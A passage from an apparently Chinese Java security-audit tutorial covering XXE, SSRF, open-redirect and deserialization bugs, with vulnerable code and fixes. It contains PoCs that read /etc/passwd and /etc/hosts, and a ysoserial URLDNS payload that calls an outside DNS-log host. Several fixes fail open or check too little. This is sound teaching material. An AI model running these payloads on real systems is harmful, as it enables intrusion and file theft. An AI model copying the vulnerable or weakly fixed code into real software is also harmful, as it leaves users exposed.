        // 使用 DocumentBuilder 解析 XML 数据，这一行可能导致 XXE 攻击
        Document document = db.parse(is);
        // 遍历 XML 节点的名称和值
        StringBuilder buf = new StringBuilder();
        NodeList rootNodeList = document.getChildNodes();
        for (int i = 0; i < rootNodeList.getLength(); i++) {
            Node rootNode = rootNodeList.item(i);
            NodeList child = rootNode.getChildNodes();
            for (int j = 0; j < child.getLength(); j++) {
                Node node = child.item(j);
                buf.append(String.format("%s: %s\n", node.getNodeName(), node.getTextContent()));
            }
        }
        sr.close();
        return buf.toString();
    } catch (Exception e) {
        // 记录异常信息
        logger.error(e.toString());
        return EXCEPT;
    }
}

```

### （八）、Unmarshaller（无回显）

```java
/**
 *  PoC
 * Content-Type: application/xml
 * <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE student[<!ENTITY out SYSTEM "file:///etc/hosts">]><student><name>&out;</name></student>
 */
public String Unmarshaller(@RequestBody String content) {
    try {
        // 创建 JAXBContext 对象，指定要映射的类 Student
        JAXBContext context = JAXBContext.newInstance(Student.class);
        // 创建 Unmarshaller 对象
        Unmarshaller unmarshaller = context.createUnmarshaller();

        // 创建 XMLInputFactory 对象
        XMLInputFactory xif = XMLInputFactory.newFactory();
        // 修复: 禁用外部实体
        // xif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
        // xif.setProperty(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");

        // 创建 XMLStreamReader 对象，用于读取 XML 数据
        XMLStreamReader xsr = xif.createXMLStreamReader(new StringReader(content));

        // 使用 Unmarshaller 对象解析 XML 数据
        Object o = unmarshaller.unmarshal(xsr);

        // 返回解析结果的字符串形式
        return o.toString();

    } catch (Exception e) {
        // 打印异常信息
        e.printStackTrace();
    }
    return null;
}

```

### （九）、 XMLStreamReader (有回显)

````java
String linux_querystring = "?data=..."; // 包含 XML 数据的查询字符串
String windows_querystring = "?data=..."; // 包含 XML 数据的查询字符串
String data = request.getParameter("data"); // 从请求中获取名为 "data" 的参数
String tmp  = "";

if (data != null) { // 检查数据是否存在
    try {
        XMLInputFactory factory = XMLInputFactory.newInstance(); // 创建 XMLInputFactory 实例
        XMLStreamReader reader = factory.createXMLStreamReader(new StringReader(request.getParameter("data"))); // 使用请求中的数据创建 XMLStreamReader

        while (reader.hasNext()) { // 循环遍历 XML 数据
            int event = reader.next(); // 获取 XML 流中的事件
            if (event == XMLStreamConstants.START_ELEMENT) { // 检查事件是否为起始元素
                if (reader.getName().toString().equals("foo")) { // 如果起始元素名为 "foo"
                    tmp = reader.getElementText(); // 获取元素的文本内容
                }
            }
        }
    } catch (Exception e) { // 处理可能发生的异常
        out.print("<pre>");
        e.printStackTrace(response.getWriter());
        out.print("</pre>");
    }
}

````



## 八、SSRF

**漏洞存在点**

社交分享(评论区)；远程图片加载/下载；图片/文章收藏；转码；在线翻译；从远程服务器请求资源等功能处。

**代码审计敏感函数**

```java
HttpURLConnection.getInputStream
URLConnection.getInputStream
Request.Get.execute
Request.Post.execute
URL.openStream
ImageIO.read
OkHttpClient.newCall.execute
HttpClients.execute
HttpClient.execute
BasicHttpEntityEnclosingRequest()
DefaultBHttpClientConnection()
BasicHttpRequest()
```

**漏洞修复**	

```
白名单校验url及ip
限制协议与端口
```

### （一）、URLConnection

漏洞代码

```java
@RequestMapping(value = "/urlConnection/vuln", method = {RequestMethod.POST, RequestMethod.GET})
    public String URLConnectionVuln(String url) {
        return HttpUtils.URLConnection(url);
    }
```

这段代码是一个 Spring MVC 控制器方法，用于处理 URL 连接请求，并返回相应的结果。

方法使用 `@RequestMapping` 注解来定义控制器的 URL 映射和请求方法。在这个例子中，URL 映射为 "/urlConnection/vuln"，请求方法可以是 POST 或 GET。

方法接受一个名为 `url` 的字符串参数，表示要连接的 URL 地址。然后，它调用 `HttpUtils.URLConnection(url)` 方法来执行 URL 连接操作，并将返回的结果作为响应返回给客户端。

进入URLConnection

~~~java
public static String URLConnection(String url) {
        try {
            URL u = new URL(url);
            URLConnection urlConnection = u.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); 
            String inputLine;
            StringBuilder html = new StringBuilder();//创建一个`StringBuilder`对象 `html`，用于存储整个HTML内容

            while ((inputLine = in.readLine()) != null) {
                html.append(inputLine);
            }
            in.close();
            return html.toString();
        } catch (Exception e) {
            logger.error(e.getMessage());
            return e.getMessage();
        }
    }
~~~

触发漏洞POC

```
http://localhost:8080/ssrf/urlConnection/vuln?url=file:///etc/passwd
http://localhost:8080/ssrf/urlConnection/vuln?url=https://baidu.com
```

漏洞修复

先是对url调用了`SecurityUtil.isHttp()`来进行检查

```java
    @GetMapping("/urlConnection/sec")
    public String URLConnectionSec(String url) {

        // Decline not http/https protocol
        if (!SecurityUtil.isHttp(url)) {
            return "[-] SSRF check failed";
        }

        try {
            SecurityUtil.startSSRFHook();
            return HttpUtils.URLConnection(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

    }

```

方法首先调用 `SecurityUtil.isHttp(url)` 方法来检查传入的 URL 是否使用 HTTP 或 HTTPS 协议。如果不是，则返回错误消息 "[-] SSRF check failed"。接下来，方法调用 `SecurityUtil.startSSRFHook()` 方法来启动 SSRF 防护钩子。这个钩子通常用于监控和阻止 SSRF 攻击。

SecurityUtil.isHttp()比较简单，就是判断url是否是以http://或https://开头

```java
    public static boolean isHttp(String url) {
        return url.startsWith("http://") || url.startsWith("https://");
    }
```

单纯的ban掉其他协议显然是不够的，还不能够防止对内网进行探测，于是在获取url内容之前，开启了一个hook来对用户行为进行监听，`SecurityUtil.startSSRFHook()`，就有效防止了ssrf攻击

### （二）、openStream

`openStream（）`方法的实现也是调用了` openConnection`生成一个` URLConnection` 对象，然后再通过这个对象调用的`getInputStream（）`方法的

```java
    @GetMapping("/openStream")
    public void openStream(@RequestParam String url, HttpServletResponse response) throws IOException {
        InputStream inputStream = null;
        OutputStream outputStream = null;
        try {
            String downLoadImgFileName = WebUtils.getNameWithoutExtension(url) + "." + WebUtils.getFileExtension(url);
            // download
            response.setHeader("content-disposition", "attachment;fileName=" + downLoadImgFileName);

            URL u = new URL(url);
            int length;
            byte[] bytes = new byte[1024];
            inputStream = u.openStream(); // send request
            outputStream = response.getOutputStream();
            while ((length = inputStream.read(bytes)) > 0) {
                outputStream.write(bytes, 0, length);
            }

        } catch (Exception e) {
            logger.error(e.toString());
        } finally {
            if (inputStream != null) {
                inputStream.close();
            }
            if (outputStream != null) {
                outputStream.close();
            }
        }
    }

```

通过`WebUtils.getNameWithoutExtension(url) + "." + WebUtils.getFileExtension(url)`来获取下载文件名,然后执行`inputStream = u.openStream();` 来看一下openStream()，也是调用了`openConnection()`，也会根据传入的协议的不同来进行处理

```java
    public final InputStream openStream() throws java.io.IOException {
        return openConnection().getInputStream();
    }

```

由此可以得知，`openStream（）`方法同样也可以进行ssrf来探测内网以及文件下载，修复方案同上

### （三）、URLConnection.getInputStream 

SSRF漏洞的基本原理是，攻击者通过构造恶意的URL，使服务器发起对内部网络或其他受信任网络资源的请求。以下是一个简单的例子：

```java
String url = request.getParameter("url"); //eg: file:///etc/passwd
//构造一个 URL 对象
URL u = new URL(url);
//调用 URL.openConnection() 方法来获取一个 URLConnection 实例
URLConnection urlConnection = u.openConnection();
//调用 getInputStream() 拿到请求的响应流，此时已经建立连接。
BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); //发起请求
String inputLine;
StringBuffer html = new StringBuffer();
while ((inputLine = in.readLine()) != null) {
html.append(inputLine);
}
System.out.println("html:" + html.toString());
in.close();

```

URLStreamHandler 是一个抽象类，每个协议都有继承它的子类 —— Handler。 Handler 定义了该如何去打开一个连接，即 openConnection() 。 如果直接传入一个 URL 字符串，会在构造对象时，根据 **protocol 自动创建对应 的 Handler 对象**。 

在调用 URL.openConnection() 获取 URLConnection 实例的时候，真实的网络连接实 际上并没有建立，只有在调用 URLConnection.connect() 方法后才会建立连接。 

**控制台输入文件内容：**

```java
String htmlContent;
String url = "http://www.baidu.com";
//String url = "file:///etc/passwd";
URL u = new URL(url);
URLConnection urlConnection = u.openConnection();//打开一个URL连接，建立连接
BufferedReader base = new BufferedReader(new InputStreamReader(urlConnecti
on.getInputStream(), "UTF-8"));

StringBuffer html = new StringBuffer();
while ((htmlContent = base.readLine()) != null) {
html.append(htmlContent); //htmlContent添加到html里面
}
base.close();
System.out.println("探测："+url);
System.out.println("----------Response------------");
System.out.println(html);

```

**文件读取：** 

```java
http://127.0.0.1:8080/ssrf/urlConnection/vuln?url=file:///etc/passwd
```

**文件下載：** 

SSRF 中的文件下载和文件读取不同点在于响应头。 

```java
response.setHeader("content-disposition", "attachment;fileName=" + filename);
```

例如：

```java
    @RequestMapping(value = "/urlConnection/download", method = {RequestMethod.POST, RequestMethod.GET})
public void downloadServlet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    String filename = "1.txt"; // 默认文件名
    String url = request.getParameter("url"); // 从请求参数获取用户提供的URL

    response.setHeader("content-disposition", "attachment;fileName=" + filename); // 设置响应头，指定下载的文件名

    int len;
    OutputStream outputStream = response.getOutputStream(); // 获取响应的输出流
    URL file = new URL(url); // 根据用户提供的URL创建URL对象
    byte[] bytes = new byte[1024];
    InputStream inputStream = file.openStream(); // 打开URL的输入流，用于读取文件内容

    while ((len = inputStream.read(bytes)) > 0) {
        outputStream.write(bytes, 0, len); // 将文件内容写入响应输出流，实现文件下载
    }

    // 关闭流
    inputStream.close();
    outputStream.close();  
}

```

```java
@GetMapping("/openStream")
public void openStream(@RequestParam String url, HttpServletResponse response) throws IOException {
    InputStream inputStream = null;
    OutputStream outputStream = null;
    try {
        String downLoadImgFileName = WebUtils.getNameWithoutExtension(url) + "." + WebUtils.getFileExtension(url);
        // 设置响应头，指定下载的文件名
        response.setHeader("content-disposition", "attachment;fileName=" + downLoadImgFileName);

        URL u = new URL(url);
        int length;
        byte[] bytes = new byte[1024];
        inputStream = u.openStream(); // 打开URL的输入流，用于读取远程资源
        outputStream = response.getOutputStream(); // 获取响应的输出流，用于写入文件内容

        while ((length = inputStream.read(bytes)) > 0) {
            outputStream.write(bytes, 0, length); // 将文件内容写入响应输出流，实现文件下载
        }

    } catch (Exception e) {
        logger.error(e.toString());
    } finally {
        if (inputStream != null) {
            inputStream.close();
        }
        if (outputStream != null) {
            outputStream.close();
        }
    }
}

```

```java
http://127.0.0.1:8080/ssrf/openStream?url=file:///1.txt
```

### （四）、HttpURLConnection.getInputStream

HttpURLConnection 是 URLConnection 的子类， 用来实现基于 HTTP URL 的请求、响应功能，每 个 HttpURLConnection 实例都可用于生成单个网络请求，支持GET、POST、PUT、DELETE等方 式。 例如：

```java
String htmlContent;
String url = "http://www.baidu.com"; 
URL u = new URL(url); // 创建URL对象
URLConnection urlConnection = u.openConnection(); // 打开URL连接
HttpURLConnection httpUrl = (HttpURLConnection) urlConnection; // 强制转换为HttpURLConnection对象
BufferedReader base = new BufferedReader(new InputStreamReader(httpUrl.getInputStream(), "UTF-8")); // 获取输入流，用于读取响应内容
StringBuffer html = new StringBuffer(); // 用于存储HTML内容

while ((htmlContent = base.readLine()) != null) {
    html.append(htmlContent); // 逐行读取HTML内容并追加到StringBuffer中
}

base.close(); // 关闭BufferedReader
System.out.println("探测：" + url);
System.out.println("----------Response------------");
System.out.println(html); // 打印HTML内容

```

HttpURLConnection 不支持file协议, 例如：file协议读取文件 file:///etc/passwd ，FileURLConnection类型不能转换为 HttpURLConnection类型 

###  （五）、Request.Get/Post.execute

Request类对HttpClient进行了封装。类似Python的requests库。 例如： 

```java
Request.Get(url).execute().returnContent().toString();
```

添加依赖： 

```html
<dependency>
<groupId>org.apache.httpcomponents</groupId>
<artifactId>fluent-hc</artifactId>
<version>4.5.13</version>
</dependency>
```

访问百度 ：

```java
import org.apache.http.client.fluent.Request;
String html = Request.Get("http://www.baidu.com").execute().returnContent().toString();
System.out.println(html);
```

### （六）、URL.openStream

```java
String url = request.getParameter("url");
URL u = new URL(url);
InputStream inputStream = u.openStream();// 打开URL的输入流
```

例如：

```java
String htmlContent;
String url = "http://www.baidu.com";
// String url = "file:///etc/passwd";
URL u = new URL(url);
System.out.println("探测："+url);
System.out.println("----------Response------------");
BufferedReader base = new BufferedReader(new InputStreamReader(u.openStream(), "UTF-8")); //获取url中的资源
StringBuffer html = new StringBuffer();
while ((htmlContent = base.readLine()) != null) {
html.append(htmlContent); //htmlContent添加到html里面
}
System.out.println(html);

```

### （七）、HttpClients.execute

```java
String url = request.getParameter("url"); 
CloseableHttpClient client = HttpClients.createDefault(); // 创建一个默认的 CloseableHttpClient
HttpGet httpGet = new HttpGet(url); // 创建 HTTP GET 请求对象
HttpResponse httpResponse = client.execute(httpGet); // 发起请求并获取响应
```

这段代码通过 Apache HttpClient 库发起 HTTP GET 请求，其中 URL 参数从 HTTP 请求的参数中获取。

例如：

```java
String htmlContent;
String url = "http://www.baidu.com";
CloseableHttpClient client = HttpClients.createDefault(); // 创建一个默认的 CloseableHttpClient
HttpGet httpGet = new HttpGet(url); // 创建 HTTP GET 请求对象
System.out.println("探测：" + url);
System.out.println("----------Response------------");
HttpResponse httpResponse = client.execute(httpGet); // 发起请求
BufferedReader base = new BufferedReader(new InputStreamReader(httpResponse.getEntity().getContent()));
StringBuffer html = new StringBuffer();
while ((htmlContent = base.readLine()) != null) {
    html.append(htmlContent); // 将htmlContent添加到html中
}
System.out.println(html);

```

### （八）、ImageIO.read

javax.imageio.ImageIO 类是JDK自带的类，使用**read()** 方法来加载图片。 它可以传入一个 URL 对象，且没有协议限制。 

```java
String url = request.getParameter("url");
URL u = new URL(url);
BufferedImage img = ImageIO.read(u);
```

例如：

```java
@GetMapping("/ImageIO/vul")
public void ImageIO(@RequestParam String url, HttpServletResponse response) {
    try {
        ServletOutputStream outputStream = response.getOutputStream();
      //从HttpServletResponse对象中获取输出流。
        ByteArrayOutputStream os = new ByteArrayOutputStream();
      //创建一个内存中的输出流，用于存储数据。
        
        // 从URL打开图像输入流
        URL u = new URL(url);
        InputStream istream = u.openStream();
        
        // 使用ImageIO创建图像输入流
        ImageInputStream stream = ImageIO.createImageInputStream(istream);
        
        // 读取图像为BufferedImage
        BufferedImage bi = ImageIO.read(stream);
        
        // 将BufferedImage写回输出流
        ImageIO.write(bi, "png", os);
        
        // 将ByteArrayOutputStream转为输入流
        InputStream input = new ByteArrayInputStream(os.toByteArray());
        
        int len;
        byte[] bytes = new byte[1024];
        
        // 从输入流读取数据并写回HttpServletResponse的输出流
        while ((len = input.read(bytes)) > 0) {
            outputStream.write(bytes, 0, len);
        }
        
        // 关闭流
        istream.close();
        stream.close();
        os.close();
        input.close();
        outputStream.close();
    } catch (IOException e) {
        // 处理异常
        e.printStackTrace();
    }
}

```

`public void ImageIO(@RequestParam String url, HttpServletResponse response)`：这是方法的声明。`@RequestParam String url`表示从请求中获取名为"url"的参数。`HttpServletResponse response`表示这个方法的返回类型是void，它接收一个HttpServletResponse对象作为参数，用于写出HTTP响应。

`ServletOutputStream outputStream = response.getOutputStream();`：从HttpServletResponse对象中获取输出流。

`ByteArrayOutputStream os = new ByteArrayOutputStream();`：创建一个内存中的输出流，用于存储数据。

```
http://127.0.0.1:8080/ssrf/ImageIO/vul?url=https://sce9a5b7c3d6db-sb-qn.qiqiuyun.net/files/system/2022/03-25/170342e05d74827841.png
```

### （九）、HttpUtils.URLConnection(url) 

```java
public static String getUrlContent(String uri) {
    try {
        URL url = new URL(uri);
        URLConnection urlConnection = url.openConnection();       
        // 从连接获取输入流
        BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
        // 读取数据并拼接到 StringBuilder
        String inputLine;
        StringBuilder html = new StringBuilder();
        while ((inputLine = in.readLine()) != null) {
            html.append(inputLine);
        }  
        // 关闭输入流
        in.close();
        
        // 返回读取到的内容
        return html.toString();
    } catch (Exception e) {
        // 异常处理，记录日志并返回错误消息
        e.printStackTrace();
        return e.getMessage();
    }
}

```

用到了 URLConnection.getInputStream:

```
  http://127.0.0.1:8080/ssrf/urlConnection/vuln?url=http://www.baidu.com
```

**漏洞修复演示**

```java
/**
 * 检查 SSRF 漏洞
 * 如果是内网 IP，返回 false，表示检查不通过。否则返回 true，即合法返回 true
 * URL 只支持 HTTP 协议
 * 设置了访问超时时间为 3 秒
 */
public static Boolean checkSSRF(String url) {
    HttpURLConnection connection;
    String finalUrl = url;
    try {
        do {
            // 判断当前请求的 URL 是否是内网 IP
            Boolean isInnerIp = isInnerIpFromUrl(finalUrl);
            if (isInnerIp) {
                return false;
            }

            // 打开连接，设置一些连接参数
            connection = (HttpURLConnection) new URL(finalUrl).openConnection();
            connection.setInstanceFollowRedirects(false);
            connection.setUseCaches(false); // 设置为 false，手动处理跳转，可以拿到每个跳转的 URL
            connection.setConnectTimeout(3 * 1000); // 设置连接超时时间为 3 秒
            connection.setRequestMethod("GET");
            connection.connect(); // 发起 DNS 请求

            // 获取响应码
            int responseCode = connection.getResponseCode();

            // 处理重定向
            if (responseCode >= 300 && responseCode <= 307 && responseCode != 304 && responseCode != 306) {
                String redirectedUrl = connection.getHeaderField("Location");
                if (redirectedUrl == null) {
                    break;
                }
                finalUrl = redirectedUrl;
                System.out.println("Redirected URL: " + finalUrl);
            } else {
                break;
            }
        } while (connection.getResponseCode() != HttpURLConnection.HTTP_OK);

        // 断开连接
        connection.disconnect();
    } catch (Exception e) {
        // 发生异常，可以根据具体情况记录日志或返回适当的结果
        return true;
    }

    // 返回结果
    return true;
}

```

这个方法的主要步骤包括：

1. 判断给定的 URL 是否是内网 IP 地址，如果是，则返回 false。
2. 针对给定的 URL 发起 HTTP 请求，设置了一些连接参数，包括超时时间和禁用缓存。
3. 处理重定向：如果响应码表明发生了重定向，获取重定向的 URL，并更新 `finalUrl`。
4. 当响应码不是重定向时，结束循环。
5. 断开连接。
6. 如果在整个过程中发生异常，返回 true。

**修复方法--白名单校验url及ip**

```java
/**
 * 判断一个 URL 的 IP 是否是内网 IP
 * 如果是内网 IP，返回 true
 * 非内网 IP，返回 false
 */
public static boolean isInnerIpFromUrl(String url) throws Exception {
    String domain = getUrlDomain(url);

    if (domain.equals("")) {
        return true; // 异常 URL 当成内网 IP 等非法 URL 处理
    }

    String ip = DomainToIP(domain);
    
    if (ip.equals("")) {
        return true; // 如果域名转换为 IP 异常，则认为是非法 URL
    }

    return isInnerIp(ip);
}

/**
 * 内网 IP 判断规则：
 * - 10.0.0.1 - 10.255.255.254 (10.0.0.0/8)
 * - 192.168.0.1 - 192.168.255.254 (192.168.0.0/16)
 * - 127.0.0.1 - 127.255.255.254 (127.0.0.0/8)
 * - 172.16.0.1 - 172.31.255.254 (172.16.0.0/12)
 */
public static boolean isInnerIp(String strIP) throws IOException {
    try {
        String[] ipArr = strIP.split("\\.");

        if (ipArr.length != 4) {
            return false;
        }

        int ip_split1 = Integer.parseInt(ipArr[1]);

        return (ipArr[0].equals("10") || ipArr[0].equals("127") || (ipArr[0].equals("172") && ip_split1 >= 16 && ip_split1 <= 31) ||
                (ipArr[0].equals("192") && ipArr[1].equals("168")));
    } catch (Exception e) {
        return false;
    }
}

```

**漏洞修复--限制协议与端口**

```java
/**
 * 从 URL 中获取域名
 * 限制为 http/https 协议
 */
public static String getUrlDomain(String url) throws IOException {
    try {
        URL u = new URL(url);

        // 检查协议是否是 http 或 https
        if (!u.getProtocol().startsWith("http") && !u.getProtocol().startsWith("https")) {
            throw new IOException("Protocol error: " + u.getProtocol());
        }

        // 返回 URL 的主机部分，即域名
        return u.getHost();
    } catch (Exception e) {
        return "";
    }
}

```

## 九、url跳转

审计参数

```
redirect
url
redirectUrl
callback
return_url
toUrl
ReturnUrl
fromUrl
redUrl
request
redirect_to
redirect_url
jump
jump_to
target
to
goto
link
linkto
domain
oauth_callback
```

修复建议

```
将重定向改成转发
白名单与黑名单相结合的限制
```

### （一）、ModelAndView 方式

```java
@GetMapping("/redirectToURL")
public ModelAndView redirectToURL(@RequestParam String redirectURL) {
    // 创建一个 ModelAndView 对象
    ModelAndView modelAndView = new ModelAndView();
    
    // 设置视图名称为重定向到指定 URL
    modelAndView.setViewName("redirect:" + redirectURL);
    
    // 返回 ModelAndView 对象
    return modelAndView;
}

```

```
URL 跳转使用方式： http://www.any.com/index.jsp?url=http://www.xxx.com
```

在上述示例中，`redirectURL` 参数由用户提供，而没有进行任何验证。攻击者可以构造恶意URL来重定向用户到恶意站点。

**修复方式**：在重定向之前验证 `redirectURL` 参数，确保它是一个受信任的URL，或者使用白名单来限制跳转目标。

### （二）、String 方式

```java
@GetMapping("/redirectToString")
public String redirectToString(@RequestParam String redirectURL) {
    return "redirect:" + redirectURL;
  //直接返回一个字符串，其中以 "redirect:" 开头的字符串表示进行重定向到指定的URL。
}
```

这个示例与上一个类似，只是使用了返回 `String` 的方式触发重定向漏洞。

**修复方式**：同样，要验证 `redirectURL` 参数并确保它是受信任的URL。

### （三）、sendRedirect 方式

```java
@GetMapping("/sendRedirect")
public void sendRedirect(@RequestParam String redirectURL, HttpServletResponse response) throws IOException {
    response.sendRedirect(redirectURL);
}
```

在上述示例中，使用 `HttpServletResponse` 的 `sendRedirect` 方法进行跳转，同样没有对 `redirectURL` 进行验证。

```java
  @RequestMapping("/sendRedirect")
    @ResponseBody
    public static void sendRedirect(HttpServletRequest request, HttpServletResponse response) throws IOException {
        String url = request.getParameter("url");
        response.sendRedirect(url); // 302 redirect
    }
```

**修复方式**：验证 `redirectURL` 参数，确保它是受信任的URL，或者使用白名单来限制跳转目标。

### （四）、RedirectAttributes 方式

```java
@GetMapping("/redirectWithAttributes")
public String redirectWithAttributes(@RequestParam String redirectURL, RedirectAttributes attributes) {
    attributes.addAttribute("url", redirectURL);
    return "redirect:/redirectToURLWithAttributes";
}
```

这个示例使用了`RedirectAttributes`来传递重定向参数。

**修复方式**：同样，验证 `redirectURL` 参数，并确保它是受信任的URL，或者使用白名单来限制跳转目标。

### （五）、设置 Header

```java
@GetMapping("/redirectWithHeader")
public void redirectWithHeader(@RequestParam String redirectURL, HttpServletResponse response) {
    response.setHeader("Location", redirectURL);
    response.setStatus(302);
}
```

这个示例是通过设置HTTP响应头来触发URL跳转漏洞。

**修复方式**：验证 `redirectURL` 参数，并确保它是受信任的URL，或者使用白名单来限制跳转目标。

总之，要修复URL跳转漏洞，您应该验证和过滤用户提供的URL，确保只有受信任的URL可以被用来进行重定向操作，或者限制跳转目标使用白名单。避免从不可信源接受和使用用户提供的URL。这些修复方式可以根据应用程序的具体需求来定制。

```java
 @RequestMapping("/setHeader")
    @ResponseBody
    public static void setHeader(HttpServletRequest request, HttpServletResponse response) {
        String url = request.getParameter("url");
        response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); // 301 redirect
        response.setHeader("Location", url);
    }

//POC  
//http://localhost:8080/urlRedirect/setHeader?url=http://www.baidu.com
```

修复建议

**1、将重定向改成转发**

转发(前往)，服务器内部的重定向，在Servlet中通过RequestDispatcher转发给另一个程序处理请求，请求的数据依然在。所以forward相当于客户端向服务器发送一次请求，服务器处理两次，请求数据不会消失且URL地址只变化一次。因为转发只能在服务器内部进行（内部跳转），不会跳转到外部。参考代码如下：

```java
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
    <form action="/urlRedirection/forward" method="get" enctype="multipart/form-data">
        <input type="text" name="url" >
        <input type="submit">
    </form>
</body>
</html>
```

```java
@RequestMapping("/forward")
@ResponseBody
public static void forward(HttpServletRequest request, HttpServletResponse response) {
    String url = request.getParameter("url");
    // 进行合法性验证
    if (isValidUrl(url)) {
        RequestDispatcher rd = request.getRequestDispatcher(url);
      //创建一个 RequestDispatcher 对象，该对象用于将请求和响应转发到由用户提供的URL。RequestDispatcher 对象通过调用 forward 方法实现请求的转发。
        try {
            rd.forward(request, response);
        } catch (Exception e) {
            e.printStackTrace();
        }
    } else {
        System.err.println("Invalid URL: " + url);
    }
}

private static boolean isValidUrl(String url) {
    // 在此添加对URL的合法性验证逻辑，确保只允许访问预期的资源
    return url.startsWith("http://") || url.startsWith("https://");
}

```

**2、白名单与黑名单相结合的限制**

就是将需要重定向的目的URL整理成白名单，在进行重定向前匹配，如果不在白名单中禁止重定向。相关白名单校验参考代码如下：

```java
    /**
     * 同时支持一级域名和多级域名，相关配置在resources目录下url_safe_domain.xml文件。
     * 优先判断黑名单，如果满足黑名单return null。
     *
     * @param url the url need to check
     * @return Safe url returns original url; Illegal url returns null;
     */
    public String checkURL(String url) throws IOException {
        if (null == url){
            return null;
        }
        try {
            URL url1 = new URL(url);
            String host = url1.getHost();
            // 必须http/https
            if (!url1.getProtocol().equals("https") && !url1.getProtocol().equals("http")) {
                return null;
            }

            // 如果满足黑名单返回null
            if (blackDomains.contains(host)){
                return null;
            }
            for(String blockDomain: blackDomains) {
                if(host.endsWith("." + blockDomain)) {
                    return null;
                }
            }

            // 支持多级域名
            if (safeDomains.contains(host)){
                return url;
            }

            // 支持一级域名
            for(String safedomain: safeDomains) {
                if(host.endsWith("." + safedomain)) {
                    return url;
                }
            }
            return null;
        } catch (NullPointerException | MalformedURLException e) {
            e.printStackTrace();
            return null;
        }
    }
```

```java
 @RequestMapping("/sendRedirect/sec")
    @ResponseBody
    public void sendRedirect_seccode(HttpServletRequest request, HttpServletResponse response)
            throws IOException {
        String url = request.getParameter("url");
        if (checkURL(url) == null) {
            response.setContentType("text/html;charset=UTF-8");
            response.setStatus(HttpServletResponse.SC_FORBIDDEN);
            response.getWriter().write("url不合法无法跳转");
            return;
        }
        response.sendRedirect(url);
    }
```

例如黑名单和白名单的配置如下

```
safeDomains=127.0.0.1,127.0.0.2
blackDomains=baidu.com,qq.com
```

当输入baidu.com时，将无法跳转。

## 十、不安全的反序列化

 ```html
序列化
把Java对象转换为字节序列的过程称为对象的序列化

反序列化
把字节序列恢复为Java对象的过程称为对象的反序列化。
 ```

重点函数

```java
ObjectInputStream.readObject

ObjectInputStream.readUnshared

XMLDecoder.readObject

Yaml.load

XStream.fromXML

ObjectMapper.readValue

JSON.parseObject

```

### （一）、常规漏洞

漏洞举例

```java
package com.example.demo;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.util.Base64;

@WebServlet("/deser")
public class aa extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        // 设置请求和响应的字符编码
        req.setCharacterEncoding("utf-8");
        resp.setCharacterEncoding("utf-8");
        resp.setContentType("text/html;charset=utf-8");

        // 从请求参数中获取经过Base64编码的字符串
        String basestr = req.getParameter("str");

        // 使用Base64解码字符串
        byte[] decodeStr = Base64.getDecoder().decode(basestr);

        // 创建ByteArrayInputStream对象，并传入解码后的字节数组
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(decodeStr);

        // 创建ObjectInputStream对象，用于反序列化
        ObjectInputStream ois = new ObjectInputStream(byteArrayInputStream);
        try {
            // 尝试进行对象反序列化
            Object o = ois.readObject();
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        } finally {
            // 关闭ObjectInputStream
            ois.close();
            // 向响应中写入消息
            resp.getWriter().write("反序列化漏洞测试");
        }
    }
}



```

**ysoserial工具地址**

```
https://github.com/Y4er/ysoserial
```

**`1、使⽤ URLDNS 探测漏洞**

```java
# 执行命令
java -jar ysoserial-main-49888d3191-1.jar URLDNS http://aa.0480437e32.ipv6.1433.eu.org | base64 

#得到payload编码如下
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAHmFhLjA0ODA0MzdlMzIuaXB2Ni4xNDMzLmV1Lm9yZ3QAAHEAfgAFdAAEaHR0cHB4dAAlaHR0cDovL2FhLjA0ODA0MzdlMzIuaXB2Ni4xNDMzLmV1Lm9yZ3g=

```

将得到的base64编码后的payload在进行url编码一下

```java
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa%2FORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F3QAHmFhLjA0ODA0MzdlMzIuaXB2Ni4xNDMzLmV1Lm9yZ3QAAHEAfgAFdAAEaHR0cHB4dAAlaHR0cDovL2FhLjA0ODA0MzdlMzIuaXB2Ni4xNDMzLmV1Lm9yZ3g%3D
```

最后访问

```
